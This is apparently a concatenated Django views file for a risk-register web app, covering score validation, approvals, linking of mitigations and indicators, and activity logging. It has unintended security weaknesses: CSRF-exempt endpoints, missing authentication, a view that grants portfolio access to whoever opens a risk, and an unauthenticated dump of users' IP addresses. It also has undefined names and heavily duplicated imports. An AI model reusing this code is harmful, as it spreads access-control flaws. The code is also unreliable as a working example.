            risk.inherent_likelihood = int(data.get('inherent_likelihood', risk.inherent_likelihood) or 0)
            risk.inherent_impact = int(data.get('inherent_impact', risk.inherent_impact) or 0)
            risk.residual_likelihood = int(data.get('residual_likelihood', risk.residual_likelihood) or 0)
            risk.residual_impact = int(data.get('residual_impact', risk.residual_impact) or 0)
            risk.targeted_likelihood = int(data.get('targeted_likelihood', risk.targeted_likelihood) or 0)
            risk.targeted_impact = int(data.get('targeted_impact', risk.targeted_impact) or 0)

            # Calculate scores
            residual_score = risk.residual_likelihood * risk.residual_impact
            targeted_score = risk.targeted_likelihood * risk.targeted_impact

            # Check if any actions exist for the risk
            has_actions = Action.objects.filter(risks=risk).exists()  # ✅ Use 'risks' instead of 'risk'
            # **Validation: Prevent saving if targeted < residual but no actions exist**
            if targeted_score < residual_score and not has_actions:
                return JsonResponse({'success': False, 'message': 'Targeted score is lower than residual score. Please add actions to justify the imposed score.'}, status=400)

            # **Score consistency checks**
            if risk.residual_likelihood > risk.inherent_likelihood or risk.residual_impact > risk.inherent_impact:
                return JsonResponse({'success': False, 'message': 'Residual risk values must be lower than or equal to inherent risk values.'}, status=400)

            if risk.targeted_likelihood > risk.residual_likelihood or risk.targeted_impact > risk.residual_impact:
                return JsonResponse({'success': False, 'message': 'Targeted risk values must be lower than or equal to residual risk values.'}, status=400)

            # Update dates (convert to datetime.date)
            risk.last_assessed_date = parse_date(data.get('last_assessed_date', str(risk.last_assessed_date)))
            risk.next_assessment_date = parse_date(data.get('next_assessment_date', str(risk.next_assessment_date)))
            risk.last_approval_date = parse_date(data.get('last_approval_date', str(risk.last_approval_date)))
            risk.next_approval_date = parse_date(data.get('next_approval_date', str(risk.next_approval_date)))

            # Save the risk
            risk.save()

            return JsonResponse({'success': True, 'redirect_url': f'/risk/{risk_id}/'})

        except ValueError as ve:
            return JsonResponse({'success': False, 'message': f'Invalid data: {str(ve)}'}, status=400)

        except Exception as e:
            return JsonResponse({'success': False, 'message': f'An error occurred: {str(e)}'}, status=500)

    return JsonResponse({'success': False, 'message': 'Invalid request method.'}, status=405)
from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from orm.models import Risk

def update_risk_field(request, risk_id):
    """
    View to handle updates to a single field in the Risk model.
    """
    if request.method == "POST" and request.is_ajax():
        risk = get_object_or_404(Risk, id=risk_id)
        field = request.POST.get('field')
        value = request.POST.get('value')

        # Validate and update the specific field
        if field in ['category', 'portfolio']:
            setattr(risk, field, int(value) if value else None)
        elif field in ['inherent_likelihood', 'inherent_impact', 'residual_likelihood', 'residual_impact', 'targeted_likelihood', 'targeted_impact']:
            setattr(risk, field, int(value))
        elif field in ['last_assessed_date', 'next_assessment_date', 'last_approval_date', 'next_approval_date']:
            setattr(risk, field, value if value else None)
        else:
            return JsonResponse({'success': False, 'message': 'Invalid field'})

        risk.save()
        return JsonResponse({'success': True, 'message': f'{field} updated successfully'})

    return JsonResponse({'success': False, 'message': 'Invalid request method'})


from django.db import IntegrityError
from django.core.exceptions import ObjectDoesNotExist
from django.contrib import messages
from django.shortcuts import render, redirect, get_object_or_404
from .models import Portfolio, UserProfile, Category, Risk

from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.db import IntegrityError
from django.core.exceptions import ObjectDoesNotExist
from .models import Risk, Portfolio, UserProfile, Category

def validate_scores(scores):
    """Helper function to validate scores (1-5)."""
    if not all(1 <= score <= 5 for score in scores):
        raise ValueError("Likelihood and impact scores must be between 1 and 5.")


from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from .models import Risk, Portfolio, Category, UserProfile

from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from .models import Risk, Portfolio, Category, UserProfile

from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from .models import Risk, Portfolio, Category, UserProfile

from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from .models import Risk, Portfolio, Category, UserProfile

# from django.db import transaction, IntegrityError

# def risk_add_view(request):
#     def get_context():
#         return {
#             'portfolios': Portfolio.objects.all(),
#             'categories': Category.objects.all(),
#             'owners': UserProfile.objects.all(),
#             'score_types': ['Inherent', 'Residual', 'Targeted'],
#             'score_range': range(1, 6),
#         }

#     def reset_sequence():
#         with connection.cursor() as cursor:
#             cursor.execute("SELECT setval('public.orm_risk_id_seq', (SELECT MAX(id) FROM orm_risk) + 1, false)")

#     if request.method == 'POST':
#         try:
#             print("Received POST data:", request.POST)

#             # Validate inputs
#             title = request.POST.get('title', '').strip()
#             description = request.POST.get('description', '').strip()
#             if not title or not description:
#                 raise ValueError("Title and description are required.")

#             portfolio_id = request.POST.get('portfolio')
#             if not portfolio_id:
#                 raise ValueError("Portfolio is required.")
#             portfolio = get_object_or_404(Portfolio, id=portfolio_id)

#             category_id = request.POST.get('category')
#             if not category_id:
#                 raise ValueError("Category is required.")
#             category = get_object_or_404(Category, id=category_id)

#             # Parse and validate scores
#             scores = {
#                 "inherent_likelihood": int(request.POST.get("inherent_likelihood", 0)),
#                 "inherent_impact": int(request.POST.get("inherent_impact", 0)),
#                 "residual_likelihood": int(request.POST.get("residual_likelihood", 0)),
#                 "residual_impact": int(request.POST.get("residual_impact", 0)),
#                 "targeted_likelihood": int(request.POST.get("targeted_likelihood", 0)),
#                 "targeted_impact": int(request.POST.get("targeted_impact", 0)),
#             }

#             with transaction.atomic():
#                 # Reset sequence to avoid gaps
#                 reset_sequence()

#                 # Create Risk
#                 risk = Risk.objects.create(
#                     title=title,
#                     description=description,
#                     portfolio=portfolio,
#                     category=category,
#                     inherent_likelihood=scores["inherent_likelihood"],
#                     inherent_impact=scores["inherent_impact"],
#                     residual_likelihood=scores["residual_likelihood"],
#                     residual_impact=scores["residual_impact"],
#                     targeted_likelihood=scores["targeted_likelihood"],
#                     targeted_impact=scores["targeted_impact"],
#                 )
#                 print(f"Risk created with ID: {risk.id}")

#                 messages.success(request, "Risk created successfully!")
#                 return redirect('risk_detail', risk_id=risk.id)

#         except IntegrityError as e:
#             print("Integrity error creating risk:", e)
#             messages.error(request, "A risk with similar properties already exists. Please review your input.")
#         except ValueError as e:
#             print("Validation error:", e)
#             messages.error(request, str(e))
#         except Exception as e:
#             print("Unexpected error:", e)
#             messages.error(request, f"An unexpected error occurred: {e}")

#         # Render back to the add view with context after error
#         context = get_context()
#         context['error'] = messages.get_messages(request)
#         return render(request, 'risk_add.html', context)

#     return render(request, 'risk_add.html', get_context())










from django.shortcuts import render, get_object_or_404
from .models import Risk, Mitigation, Action, Indicator, Event, Procedure, Opportunity, ITAsset

def get_fields_of_related_item(item):
    """
    Helper function to retrieve field names and their values for a given model instance.
    """
    fields = {}
    for field in item._meta.get_fields():
        if not field.is_relation:  # Skip related fields
            fields[field.name] = getattr(item, field.name)
    return fields

from django.shortcuts import render, get_object_or_404
from .models import Risk, Category, Portfolio

def get_fields_of_related_item(item):
    """
    Utility function to retrieve all fields and their values for a related item.
    """
    return {field.name: getattr(item, field.name) for field in item._meta.fields}

from types import SimpleNamespace
from django.shortcuts import get_object_or_404, render
from .models import Risk, Category, Portfolio

def get_fields_of_related_item(obj):
    """
    Extracts a dictionary of field names and values from the given object.
    """
    return {field.name: getattr(obj, field.name, None) for field in obj._meta.fields}

from django.shortcuts import get_object_or_404, render
from types import SimpleNamespace
from .models import Risk, Category, Portfolio, UserProfile

from django.shortcuts import get_object_or_404, render
from types import SimpleNamespace
from .models import Risk, Category, Portfolio, UserProfile


from django.shortcuts import get_object_or_404, render
from django.utils.timezone import localtime
from .models import Risk, Category, Portfolio, UserProfile, RiskScoreHistory


def prepare_scores(risk, score_types):
    """
    Prepare score details (likelihood, impact, and score) for each score type.
    """
    return {
        score_type: {
            "likelihood": getattr(risk, f"{score_type.lower()}_likelihood", 0),
            "impact": getattr(risk, f"{score_type.lower()}_impact", 0),
            "score": getattr(risk, f"{score_type.lower()}_likelihood", 0)
                     * getattr(risk, f"{score_type.lower()}_impact", 0),
        }
        for score_type in score_types
    }


def prepare_trend_data(score_history):
    """
    Prepare trend data for the scores.
    """
    return {
        "dates": [localtime(entry.timestamp).strftime('%Y-%m-%d') for entry in score_history],
        "inherent": [entry.score for entry in score_history if entry.score_type == 'inherent'],
        "residual": [entry.score for entry in score_history if entry.score_type == 'residual'],
        "targeted": [entry.score for entry in score_history if entry.score_type == 'targeted'],
    }


def generate_heatmap(score_range):
    """
    Generate heatmap data based on score range.
    """
    return [
        [
            {
                "likelihood": col,
                "impact": row,
                "score": col * row,
                "color": "green" if col * row <= 6 else "orange" if col * row <= 12 else "red",
            }
            for col in score_range
        ]
        for row in reversed(score_range)  # Reverse the Y-axis
    ]

from django.shortcuts import get_object_or_404, render
from django.utils.timezone import localtime
from .models import Risk, Category, Portfolio, UserProfile, RiskScoreHistory


def get_risk(risk_id):
    """
    Retrieve the risk instance with all necessary prefetches.
    """
    return get_object_or_404(
        Risk.objects.prefetch_related(
            'owners', 'mitigations', 'actions', 'indicators',
            'events', 'procedures', 'opportunities', 'related_assets'
        ),
        id=risk_id
    )


def get_scores(risk, score_types):
    """
    Prepare score details (likelihood, impact, and score) for each score type.
    """
    return {
        score_type: {
            "likelihood": getattr(risk, f"{score_type.lower()}_likelihood", 0),
            "impact": getattr(risk, f"{score_type.lower()}_impact", 0),
            "score": getattr(risk, f"{score_type.lower()}_likelihood", 0)
                     * getattr(risk, f"{score_type.lower()}_impact", 0),
        }
        for score_type in score_types
    }


from collections import defaultdict

def get_score_history(risk):
    # Fetch score history for the given risk, ordered by timestamp
    score_entries = RiskScoreHistory.objects.filter(risk=risk).order_by('timestamp')
    # print(f"Fetched score entries: {list(score_entries)}")

    # Use a dictionary to aggregate data by date
    score_data = defaultdict(lambda: {"inherent": None, "residual": None, "targeted": None})
    
    for entry in score_entries:
        date_str = entry.timestamp.strftime('%Y-%m-%d')
        # print(f"Processing entry: {entry}, Date: {date_str}, Score Type: {entry.score_type}, Score: {entry.score}")
        
        if entry.score_type == 'inherent':
            score_data[date_str]["inherent"] = entry.score
        elif entry.score_type == 'residual':
            score_data[date_str]["residual"] = entry.score
        elif entry.score_type == 'targeted':
            score_data[date_str]["targeted"] = entry.score
    
    # print(f"Aggregated score data: {dict(score_data)}")

    # Convert aggregated data into lists
    dates = list(score_data.keys())
    inherent_scores = [score_data[date]["inherent"] for date in dates]
    residual_scores = [score_data[date]["residual"] for date in dates]
    targeted_scores = [score_data[date]["targeted"] for date in dates]

    print(f"Dates: {dates}")
    print(f"Inherent Scores: {inherent_scores}")
    print(f"Residual Scores: {residual_scores}")
    print(f"Targeted Scores: {targeted_scores}")
    
    return {
        "dates": dates,
        "inherent": inherent_scores,
        "residual": residual_scores,
        "targeted": targeted_scores,
    }

def get_heatmap(score_range):
    """
    Generate heatmap data based on the score range.
    """
    return [
        [
            {
                "likelihood": col,
                "impact": row,
                "score": col * row,
                "color": "green" if col * row <= 6 else "orange" if col * row <= 12 else "red",
            }
            for col in score_range
        ]
        for row in reversed(score_range)  # Reverse the Y-axis
    ]


def get_plotted_scores(scores):
    """
    Prepare plotted scores for the heatmap.
    """
    return [
        {
            "type": score_type,
            "likelihood": scores[score_type]["likelihood"],
            "impact": scores[score_type]["impact"],
            "color": "#4b0082" if score_type == "Inherent" else "#9400d3" if score_type == "Residual" else "#00ced1",
        }
        for score_type in scores
    ]




from django.shortcuts import render, get_object_or_404
from collections import defaultdict
from django.utils.timezone import localtime


from collections import defaultdict
from django.utils.timezone import localtime
from django.shortcuts import render, get_object_or_404
from .models import Risk, RiskScoreHistory, Event, ApprovalRequest, Category, Portfolio, UserProfile

from collections import defaultdict
from django.shortcuts import render, get_object_or_404
from django.utils.timezone import localtime
from django.db.models import Q

from django.shortcuts import get_object_or_404, render
from collections import defaultdict
from django.utils.timezone import localtime
from .models import Risk, ApprovalRequest, Event


from django.shortcuts import get_object_or_404, render
from django.utils.timezone import now
from collections import defaultdict
from datetime import timedelta

def calculate_countdown(due_date):
    """Calculate the countdown in days from today to the due date."""
    if due_date:
        return (due_date - now().date()).days
    return None



from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from django.utils.timezone import now
from .models import ApprovalRequest, UserProfile

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from django.utils.timezone import now
from .models import ApprovalRequest, UserProfile

def approve_approval_request(request, approval_id):
    if request.method == 'POST':
        try:
            # Fetch the approval request
            approval_request = get_object_or_404(ApprovalRequest, id=approval_id)

            # Ensure the user has permission to approve
            current_user_profile = UserProfile.objects.get(user=request.user)
            if approval_request.user != current_user_profile and not request.user.is_superuser:
                return JsonResponse({'success': False, 'error': 'Permission denied.'}, status=403)

            # ✅ Update the approval request
            approval_request.status = 'approved'
            approval_request.response_date = now()
            approval_request.save()

            # ✅ Update the related risk
            risk = approval_request.risk
            risk.last_approval_date = now()  # Use the current timestamp
            risk.next_approval_date = now() + risk.get_approval_cycle_timedelta()  # Base next approval on today
            risk.last_approved_by = approval_request.user
            risk.save()

            # ✅ Create a new pending approval request based on TODAY + cycle, not future approval date
            ApprovalRequest.objects.create(
                risk=risk,
                user=approval_request.user,
                status='pending',
                rational="Automatically generated approval request",
                due_date=now().date() + risk.get_approval_cycle_timedelta()
            )

            # ✅ Return a success response
            return JsonResponse({'success': True})

        except ApprovalRequest.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'Approval request not found.'}, status=404)

    return JsonResponse({'success': False, 'error': 'Invalid request method.'}, status=400)


from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

@csrf_exempt
def update_risk_owners(request, risk_id):
    """
    API to add or remove owners for a specific risk.
    """
    if request.method != 'POST':
        return JsonResponse({'error': 'Invalid HTTP method'}, status=405)

    try:
        risk = Risk.objects.get(id=risk_id)
        data = json.loads(request.body)
        action = data.get('action')  # 'add' or 'remove'
        user_profile_id = data.get('user_profile_id')

        if not action or not user_profile_id:
            return JsonResponse({'error': 'Missing action or user_profile_id'}, status=400)

        user_profile = UserProfile.objects.get(id=user_profile_id)

        if action == 'add':
            risk.owners.add(user_profile)
        elif action == 'remove':
            risk.owners.remove(user_profile)
        else:
            return JsonResponse({'error': 'Invalid action'}, status=400)

        return JsonResponse({'success': True})
    except Risk.DoesNotExist:
        return JsonResponse({'error': 'Risk not found'}, status=404)
    except UserProfile.DoesNotExist:
        return JsonResponse({'error': 'User profile not found'}, status=404)
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=500)


from django.urls import path

from django.contrib.auth.views import LoginView



from django.contrib.auth.views import LoginView

class CustomLoginView(LoginView):
    template_name = 'admin/login.html'  # Optional: If you want to use a custom template for login
    redirect_authenticated_user = True  # Optional: Redirect authenticated users to a different page (like home)

    def get_success_url(self):
        # This method specifies the redirect URL after a successful login
        return '/'


from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import get_object_or_404
from orm.models import Risk, Action  # Replace 'orm' with your app name
import json

@csrf_exempt
def add_action(request):
    """
    Adds a new action, assigns it to the same portfolio as the risk,
    sets the owner to the current user, and links it to the risk.
    """
    if request.method == 'POST':
        try:
            # Parse JSON data from the request body
            data = json.loads(request.body)
            risk_id = data.get('risk_id')
            title = data.get('title')

            # Validate the required fields
            if not risk_id:
                return JsonResponse({'success': False, 'error': 'Risk ID is required.'}, status=400)
            if not title:
                return JsonResponse({'success': False, 'error': 'Title is required for an action.'}, status=400)

            # Retrieve the Risk object
            risk = get_object_or_404(Risk, id=risk_id)

            # Check if the risk has an associated portfolio
            if not risk.portfolio:
                return JsonResponse({'success': False, 'error': 'The specified risk does not have an associated portfolio.'}, status=400)

            # Check if the current user has an associated UserProfile
            if not hasattr(request.user, 'userprofile'):
                return JsonResponse({'success': False, 'error': 'UserProfile is required for the current user.'}, status=400)

            # Create a new Action and link it to the risk
            action = Action.objects.create(
                title=title,
                description=title,  # Use the title as the description
                portfolio=risk.portfolio,  # Assign the risk's portfolio to the action
                owner=request.user.userprofile,  # Assign the current user as the owner
                deadline = timezone.now().date(), 
            )

            # Link the action to the risk
            risk.actions.add(action)

            # Return a successful response with the new action's details
            return JsonResponse({'success': True, 'id': action.id, 'title': action.title})

        except json.JSONDecodeError:
            # Handle cases where the request body is not valid JSON
            return JsonResponse({'success': False, 'error': 'Invalid JSON data in the request body.'}, status=400)

        except Exception as e:
            # Handle unexpected errors
            return JsonResponse({'success': False, 'error': f'An unexpected error occurred: {str(e)}'}, status=500)

    # Return an error for non-POST requests
    return JsonResponse({'success': False, 'error': 'Invalid request method. Only POST is allowed.'}, status=405)

@csrf_exempt
@login_required
def add_mitigation(request):
    """
    View to add a new mitigation, assign the portfolio of the risk,
    set the current user as an owner, and link it to the risk.
    """
    if request.method != 'POST':
        return JsonResponse({'success': False, 'error': 'Invalid request method.'}, status=405)

    try:
        # Parse JSON data from the request
        data = json.loads(request.body)
        title = data.get('title')
        risk_id = data.get('risk_id')

        # Validate required fields
        if not title:
            return JsonResponse({'success': False, 'error': 'Title is required.'}, status=400)
        if not risk_id:
            return JsonResponse({'success': False, 'error': 'Risk ID is required.'}, status=400)

        # Fetch the risk and ensure it has a portfolio
        risk = get_object_or_404(Risk, id=risk_id)
        if not risk.portfolio:
            return JsonResponse({'success': False, 'error': 'Risk does not have a portfolio assigned.'}, status=400)

        # Ensure the current user has a UserProfile
        user_profile = getattr(request.user, 'userprofile', None)
        if not user_profile:
            return JsonResponse({'success': False, 'error': 'User does not have a UserProfile.'}, status=400)

        # Create the mitigation with the risk's portfolio
        mitigation = Mitigation.objects.create(
            title=title,
            description=title,
            portfolio=risk.portfolio  # Assign portfolio
        )

        # Assign the current user as an owner of the mitigation
        mitigation.owners.add(user_profile)

        # Link the mitigation to the risk
        risk.mitigations.add(mitigation)

        return JsonResponse({
            'success': True,
            'mitigation_id': mitigation.id,
            'message': 'Mitigation created and linked successfully.'
        })

    except Exception as e:
        # Handle unexpected errors
        return JsonResponse({'success': False, 'error': f'Unexpected error: {str(e)}'}, status=500)
@csrf_exempt
def add_indicator(request):
    """
    Adds a new indicator, assigns it to the same portfolio as the risk,
    sets the owner to the current user, and links it to the risk.
    """
    if request.method == 'POST':
        try:
            # Parse request data
            data = json.loads(request.body)
            risk_id = data.get('risk_id')

            if not risk_id:
                return JsonResponse({'success': False, 'error': 'Risk ID is required.'}, status=400)

            # Get the risk instance
            risk = get_object_or_404(Risk, id=risk_id)

            # Validate the title field
            title = data.get('title')
            if not title:
                return JsonResponse({'success': False, 'error': 'Title is required for an Indicator.'}, status=400)

            # Fetch other data with defaults
            current_value = data.get('current_value', 0)
            reporting_date = data.get('reporting_date', now().date())  # Default to today's date if not provided

            # Ensure the risk has a portfolio
            if not risk.portfolio:
                return JsonResponse({'success': False, 'error': 'Risk does not have a portfolio assigned.'}, status=400)

            # Ensure the current user has a UserProfile
            if not hasattr(request.user, 'userprofile'):
                return JsonResponse({'success': False, 'error': 'UserProfile is required for the current user.'}, status=400)

            # Create the Indicator instance
            indicator = Indicator.objects.create(
                title=title,
                current_value=current_value,
                reporting_date=reporting_date,
                portfolio=risk.portfolio,  # Assign the risk's portfolio
                owner=request.user.userprofile  # Assign the current user as the owner
            )

            # Link the Indicator to the Risk
            risk.indicators.add(indicator)

            return JsonResponse({
                'success': True,
                'id': indicator.id,
                'title': indicator.title,
                'current_value': indicator.current_value,
                'reporting_date': indicator.reporting_date
            })

        except Exception as e:
            # Handle unexpected errors
            return JsonResponse({'success': False, 'error': str(e)}, status=500)

    return JsonResponse({'success': False, 'error': 'Invalid request method.'}, status=405)


from django.shortcuts import get_object_or_404, render
from django.utils.timezone import localtime
from collections import defaultdict
from .models import Risk, RiskScoreHistory, Category, Portfolio, UserProfile, Event, LikelihoodImpactDescription

from django.contrib.auth.decorators import login_required
from django.shortcuts import get_object_or_404, render
from collections import defaultdict
from django.utils.timezone import localtime

from django.shortcuts import get_object_or_404, render
from django.contrib.auth.decorators import login_required
from django.utils.timezone import localtime
from collections import defaultdict
from django.db.models import Q

from django.shortcuts import get_object_or_404, render
from django.contrib.auth.decorators import login_required
from django.utils.timezone import localtime
from collections import defaultdict
from django.db.models import Q

@login_required
def risk_detail_view(request, risk_id):
    """
    View to display detailed information for a specific risk.
    """
    # Fetch the risk object
    risk = get_object_or_404(Risk, id=risk_id)
    user_profile = request.user.userprofile
    user_portfolios = user_profile.portfolios.all()

    # **Ensure user has access to the risk's portfolio**
    if risk.portfolio and risk.portfolio not in user_portfolios:
        user_profile.portfolios.add(risk.portfolio)  # Add the risk's portfolio to the user
        user_profile.save()

    # Prepare scores
    scores = {
        'inherent': {
            'likelihood': risk.inherent_likelihood,
            'impact': risk.inherent_impact,
            'score': risk.inherent_likelihood * risk.inherent_impact,
        },
        'residual': {
            'likelihood': risk.residual_likelihood,
            'impact': risk.residual_impact,
            'score': risk.residual_likelihood * risk.residual_impact,
        },
        'targeted': {
            'likelihood': risk.targeted_likelihood,
            'impact': risk.targeted_impact,
            'score': risk.targeted_likelihood * risk.targeted_impact,
        },
    }

    # Score history and trend data
    score_history = RiskScoreHistory.objects.filter(risk=risk).order_by('timestamp')
    aggregated_scores = defaultdict(lambda: {'inherent': None, 'residual': None, 'targeted': None})
    for entry in score_history:
        date_str = localtime(entry.timestamp).strftime('%Y-%m-%d')
        if entry.score_type in aggregated_scores[date_str]:
            aggregated_scores[date_str][entry.score_type] = entry.score

    dates = list(aggregated_scores.keys())
    trend_data = {
        "dates": dates,
        "inherent": [aggregated_scores[date]['inherent'] for date in dates],
        "residual": [aggregated_scores[date]['residual'] for date in dates],
        "targeted": [aggregated_scores[date]['targeted'] for date in dates],
    }

    # Heatmap and plotted scores
    heatmap = get_heatmap(range(1, 6))
    plotted_scores = get_plotted_scores(scores)

    # Related data
    mitigations = risk.mitigations.all()
    all_mitigations = Mitigation.objects.filter(
    portfolio__in=user_profile.portfolios.all()
    ).exclude(
        id__in=mitigations.values_list('id', flat=True)
    ).order_by('portfolio__name', 'title')

    actions = risk.actions.all()
    all_actions = Action.objects.filter(portfolio__in=user_profile.portfolios.all()).exclude(
        id__in=actions.values_list('id', flat=True)
    ).order_by('portfolio__name', 'title')

    indicators = risk.indicators.all()
    all_indicators = Indicator.objects.filter(portfolio__in=user_profile.portfolios.all()).exclude(
        id__in=indicators.values_list('id', flat=True)
    ).order_by('portfolio__name', 'title')

    approvals_data = [
        {'approval': approval, 'countdown': calculate_countdown(approval.due_date)}
        for approval in risk.approval_requests.order_by('-due_date', '-id')
    ]

    # Events
    available_events = Event.objects.filter(portfolio__in=user_profile.portfolios.all()).order_by('-date')

    # Breadcrumbs
    breadcrumbs = [
        {"name": "Home", "url": "/"},
        {"name": "Risks", "url": "/orm/risk/"},
        {"name": risk.title, "url": f"/risk/{risk_id}/"},
    ]

    # Fetch descriptions
    likelihood_descriptions = {desc.score: desc.description for desc in LikelihoodImpactDescription.objects.filter(category='likelihood')}
    impact_descriptions = {desc.score: desc.description for desc in LikelihoodImpactDescription.objects.filter(category='impact')}

    # Check if the user is an owner or superuser
    is_owner_or_superuser = request.user.is_superuser or user_profile in risk.owners.all()

    # Fetch related IT assets, procedures, opportunities, and threats
    it_assets = risk.related_assets.all().order_by('portfolio__name', 'name')
    all_it_assets = ITAsset.objects.exclude(id__in=it_assets.values_list('id', flat=True)).order_by('portfolio__name', 'name')

    procedures = risk.procedures.all()
    all_procedures = Procedure.objects.exclude(id__in=procedures.values_list('id', flat=True)).order_by('portfolio__name', 'title')

    opportunities = risk.opportunities.filter(portfolio__in=user_profile.portfolios.all())
    all_opportunities = Opportunity.objects.filter(portfolio__in=user_profile.portfolios.all()).exclude(
        id__in=opportunities.values_list('id', flat=True)
    ).order_by('portfolio__name', 'title')

    threats = risk.threats.filter(portfolio__in=user_profile.portfolios.all())
    all_threats = Threat.objects.filter(portfolio__in=user_profile.portfolios.all()).exclude(
        id__in=threats.values_list('id', flat=True)
    ).order_by('portfolio__name', 'title')
    today = now().date()

    context = {
        'risk': risk,
        'categories': Category.objects.all().order_by('name'),
        'portfolios': user_profile.portfolios.all().order_by('name'),  # Ensures user sees only their portfolios
        'owners': risk.owners.all(),
        'all_user_profiles': UserProfile.objects.all(),
        'score_types': ['Inherent', 'Residual', 'Targeted'],
        'scores': scores,
        'score_range': range(1, 6),
        'heatmap': heatmap,
        'plotted_scores': plotted_scores,
        'trend_data': trend_data,
        'breadcrumbs': breadcrumbs,
        'mitigations': mitigations,
        'all_mitigations': all_mitigations,
        'actions': actions,
        'all_actions': all_actions,
        'indicators': indicators,
        'all_indicators': all_indicators,
        'approvals': approvals_data,
        'events': risk.events.all(),
        'available_events': available_events,
        'opportunities': opportunities,
        'all_opportunities': all_opportunities,
        'threats': threats,
        'all_threats': all_threats,
        'approval_cycle_choices': Risk.APPROVAL_CYCLE_CHOICES,
        'likelihood_descriptions': likelihood_descriptions,
        'impact_descriptions': impact_descriptions,
        'is_owner_or_superuser': is_owner_or_superuser,
        'it_assets': it_assets,
        'all_it_assets': all_it_assets,
        'procedures': procedures,
        'all_procedures': all_procedures,
        'today': today,  # ✅ Added this to check overdue actions in the template

    }

    return render(request, 'risk_detail.html', context)



from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json
from orm.utils.openai_utils import fetch_web_search_results

import openai
import re
from django.conf import settings


import openai
import re
from django.conf import settings
from dotenv import load_dotenv
from openai import OpenAI, OpenAIError, RateLimitError, Timeout
import os
import time

env_path = "/home/alexis/projects/ormproject/.env"
load_dotenv(env_path)

# Get API Key
api_key = os.getenv("OPENAI_API_KEY")
if not api_key:
    raise ValueError("❌ ERROR: OPENAI_API_KEY is not set. Please check your .env file.")

# Initialize OpenAI client
client = OpenAI(api_key=api_key)




# client = openai.OpenAI(api_key=settings.OPENAI_API_KEY)

from django.http import JsonResponse
from .utils.openai_utils import fetch_web_search_results

@csrf_exempt
def risk_search(request):
    """Search risk-related information with AI-powered insights and sources."""
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            query = data.get("query")

            if not query:
                return JsonResponse({"error": "Query parameter is required."}, status=400)

            search_results = fetch_web_search_results(query)

            return JsonResponse({"success": True, "results": search_results})

        except Exception as e:
            return JsonResponse({"error": str(e)}, status=500)

    return JsonResponse({"error": "Invalid request method."}, status=405)



# orm/views.py
from collections import defaultdict
from django.utils import timezone
from django.shortcuts import render
from django.core.paginator import Paginator
from orm.models import UserActivityLog

def user_activity_dashboard(request):
    """
    Display all user activities with pagination.
    """
    activities = UserActivityLog.objects.select_related('user').order_by('-timestamp')
    total_activities = activities.count()
    paginator = Paginator(activities, 25)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)

    grouped_activities = defaultdict(list)
    for activity in page_obj:
        user = activity.user.username if activity.user else 'Anonymous'
        grouped_activities[user].append({
            'activity_type': activity.activity_type,
            'timestamp': activity.timestamp,
            'ip_address': activity.ip_address,
            'page_accessed': activity.page_accessed,
            'user_agent': activity.user_agent,
            'session_key': activity.session_key,
            'referrer': activity.referrer,
        })

    return render(request, 'user_activity_dashboard.html', {
        'activities': dict(grouped_activities),
        'total_activities': total_activities,
        'last_updated': timezone.now(),
        'page_obj': page_obj,
    })



from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from .models import Risk, Event
from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from .models import Risk, Event

def link_event_to_risk(request, risk_id):
    if request.method == "POST":
        event_id = request.POST.get("event_id")
        risk = get_object_or_404(Risk, id=risk_id)
        event = get_object_or_404(Event, id=event_id)

        # Link the event to the risk
        risk.events.add(event)
        return JsonResponse({"success": True, "message": "Event linked successfully!"})

    return JsonResponse({"success": False, "message": "Invalid request."}, status=400)

from django.http import JsonResponse

from django.http import JsonResponse
from django.contrib.auth.models import User

from django.http import JsonResponse
from django.contrib.auth.models import User

def user_activity_data(request):
    # Fetch all users
    users = User.objects.all()

    # Retrieve all activities without filtering by type
    activities_by_user = {
        user.username: UserActivityLog.objects.filter(user=user).order_by('-timestamp')
        for user in users
    }

    # Format data for JSON response
    data = {
        user: [
            {
                "activity_type": activity.activity_type,
                "timestamp": activity.timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                "ip_address": activity.ip_address,
            }
            for activity in activities
        ]
        for user, activities in activities_by_user.items() if activities.exists()
    }

    return JsonResponse({"activities": data})

from django.http import JsonResponse
from django.contrib.auth.decorators import login_required
import json

@login_required
def link_indicator(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk_id = data.get('risk_id')
        indicator_id = data.get('indicator_id')

        try:
            risk = Risk.objects.get(id=risk_id)
            indicator = Indicator.objects.get(id=indicator_id)
            risk.indicators.add(indicator)  # Link the indicator
            return JsonResponse({'success': True})
        except Risk.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'Risk not found.'})
        except Indicator.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'Indicator not found.'})

    return JsonResponse({'success': False, 'error': 'Invalid request method.'})


@login_required
def unlink_indicator(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        risk_id = data.get('risk_id')
        indicator_id = data.get('indicator_id')

        try:
            risk = Risk.objects.get(id=risk_id)
            indicator = Indicator.objects.get(id=indicator_id)
            risk.indicators.remove(indicator)  # Unlink the indicator
            return JsonResponse({'success': True})
        except Risk.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'Risk not found.'})
        except Indicator.DoesNotExist:
            return JsonResponse({'success': False, 'error': 'Indicator not found.'})

    return JsonResponse({'success': False, 'error': 'Invalid request method.'})

from django.http import JsonResponse
from django.shortcuts import get_object_or_404
from django.contrib.auth.decorators import login_required
from .models import Risk, Opportunity, Threat
import json

@login_required
def link_opportunity(request, risk_id):
    """Link an existing opportunity to the specified risk."""
    if request.method == "POST":
        data = json.loads(request.body)
